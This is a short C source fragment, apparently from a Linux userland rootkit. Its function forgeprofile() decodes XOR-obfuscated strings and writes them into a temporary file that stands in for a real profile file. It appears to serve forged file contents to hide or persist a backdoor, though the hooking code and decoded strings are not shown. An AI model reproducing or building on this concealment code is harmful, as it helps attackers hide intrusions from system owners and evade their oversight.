FILE *forgeprofile(const char *pathname){
    FILE *tmp = tmpfile();
    if(!tmp) return NULL;

    char *real = xordup(REAL_PROFILE);
    if(real != NULL){
        char *goto_string = xordup(GOTO_NOTICE);
        if(goto_string){
            fprintf(tmp, goto_string, real);
            fflush(tmp);
        }
        clean(real);
    }
    for(size_t i = 0; i < MAGIC_PROFILE_SIZE; i++){
        char *rc = xordup(magic_profile[i]);
        if(!rc) continue;
        fprintf(tmp, "%s", rc);
        fflush(tmp);
        clean(rc);
    }

    rewind(tmp);
    return tmp;
}